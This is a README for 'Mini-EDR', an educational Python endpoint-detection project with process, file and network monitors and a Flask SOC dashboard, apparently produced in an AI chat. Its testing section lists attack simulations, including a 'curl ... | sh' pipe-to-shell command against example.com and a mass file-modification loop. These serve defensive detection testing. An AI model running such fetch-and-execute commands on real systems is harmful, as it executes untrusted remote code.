```markdown
# 🛡️ Mini-EDR – Endpoint Detection & Response System

Mini-EDR is a **behavior-based Endpoint Detection & Response (EDR)** system built using Python. It monitors **process activity, file system behavior, and network traffic** to detect modern attack patterns in real-time.

- **Suspicious script execution** (e.g., pipe-to-shell)
- **Ransomware-like behavior** (mass file modifications)
- **Possible C2 (Command & Control)** network beaconing

The project also includes a **SOC-style web dashboard** to visualize security alerts for incident response.

---

## 🧱 Project Structure

```text
mini-edr/
├── agent/
│   ├── process_monitor.py  # Detects malicious process behavior
│   ├── file_monitor.py     # Detects ransomware-style file activity
│   └── network_monitor.py  # Detects C2-like network beaconing
├── server/
│   ├── detector.py         # Central detection & correlation engine
│   └── dashboard.py        # SOC-style Flask dashboard
├── monitored_dir/          # Directory used for ransomware testing
├── logs/
│   └── edr.log             # Central JSON event log
├── start_edr.sh            # Service launcher script
├── README.md
├── .gitignore
└── venv/                   # Python virtual environment

```

---

## 🧠 Architecture Overview

```text
[      Agent Layer      ]
   ├─ Process Monitor
   ├─ File Monitor
   └─ Network Monitor
           ↓ (JSON Events)
    [ Central Log: edr.log ]
           ↓
    [  Detection Engine    ]
           ↓ (Alert Correlation)
    [    SOC Dashboard     ]

```

---

## ⚙️ Requirements

* **OS:** Linux (Tested on Debian / Kali / Ubuntu)
* **Language:** Python 3.9+
* **Privileges:** Root/Sudo may be required for certain network captures.

---

## 🛠️ Installation

```bash
# Navigate to project directory
cd /home/baby/pro1/mini-edr

# Setup Virtual Environment
python3 -m venv venv
source venv/bin/activate

# Install Dependencies
pip install psutil watchdog flask requests

```

---

## ▶️ How to Run (Step-by-Step)

Open separate terminal tabs for each component (ensure `venv` is active in each):

| Component | Command |
| --- | --- |
| **1. Process Monitor** | `python agent/process_monitor.py` |
| **2. File Monitor** | `python agent/file_monitor.py` |
| **3. Network Monitor** | `python agent/network_monitor.py` |
| **4. Detection Engine** | `python server/detector.py` |
| **5. SOC Dashboard** | `python server/dashboard.py` |

**Access the Dashboard:** Open your browser to [http://127.0.0.1:5001](http://127.0.0.1:5001)

---

## 🧪 Testing Scenarios

### 🧨 1. Ransomware Simulation (Mass File Modification)

```bash
cd monitored_dir
for i in {1..30}; do echo "encrypt" >> file$i.txt; done

```

* **Expected Result:** `HIGH` severity alert: "Possible ransomware behavior (mass file modification)".

### 🌐 2. Network Detection (C2-like Behavior)

```bash
for i in {1..10}; do curl [http://example.com](http://example.com); done

```

* **Expected Result:** Network alert triggered for repeated outbound connections (beaconing).

### 🧪 3. Process-Based Attack

```bash
bash -c "curl [http://example.com](http://example.com) | sh"

```

* **Expected Result:** Process alert: "Script downloading from internet".

---

## 🚨 Alert Classification

| Type | Description |
| --- | --- |
| **PROCESS** | Suspicious script execution or shell pipes. |
| **FILE** | Mass file modifications indicating encryption/data wiping. |
| **NETWORK** | High-frequency outbound traffic to external IPs. |

> **Note:** Only high-severity alerts are forwarded to the dashboard to reduce SOC fatigue and noise.

---

## 🎥 Demo Video (YouTube)

📺 **Project Demo:**  
👉 https://www.youtube.com/watch?v=YOUR_VIDEO_LINK_HERE

### 📌 Demo Covers:
- Overall system architecture
- Live attack simulation (process, file & network)
- Real-time SOC dashboard alerts
- Detection logic & hardening approach


---

## 🔐 Hardening & Design

* **Alert Deduplication:** Prevents flooding the dashboard with the same event.
* **Cooldown Windows:** Groups related events into single incidents.
* **Allowlisting:** Built-in mechanism to reduce false positives from system processes.

---

## 🎯 Use Cases

* **Blue Team Practice:** Understand how telemetry is gathered and analyzed.
* **Detection Engineering:** Learn how to write logic that catches malicious patterns.
* **Portfolio Project:** A tangible demonstration of security engineering skills for interviews.

---

*Disclaimer: This is a user-space EDR for educational purposes and is not intended to replace enterprise-grade kernel-level protection.*

```

---

### What's next?
Would you like me to create the **`start_edr.sh`** script for you so you can launch all those components with a single command?

```
